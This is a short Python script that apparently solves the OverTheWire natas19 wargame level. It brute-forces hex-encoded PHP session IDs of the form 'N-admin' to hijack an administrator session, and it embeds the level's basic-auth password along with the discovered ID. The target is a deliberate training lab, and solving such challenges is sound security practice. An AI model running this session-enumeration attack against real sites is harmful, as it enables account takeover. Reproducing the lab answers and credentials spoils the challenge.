import requests

# 3535312d73696e61
# 3230362d53

Url = "http://natas19.natas.labs.overthewire.org/index.php"
Basic_User = "natas19"
Basic_Pass = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
for i in range(0,640):
    Str = str(i) + "-admin";
    Str = Str.encode("utf-8").hex()
    resp = requests.post(Url,
            auth=(Basic_User,Basic_Pass),cookies={"PHPSESSID":Str})
    print(i)
    if( "You are logged in as a regular user" not in resp.text):
        print(resp.text)
        break


#    3536342d61646d696e
#    564-admin
            


print ("Encoded String: " + Str)

            
            
           
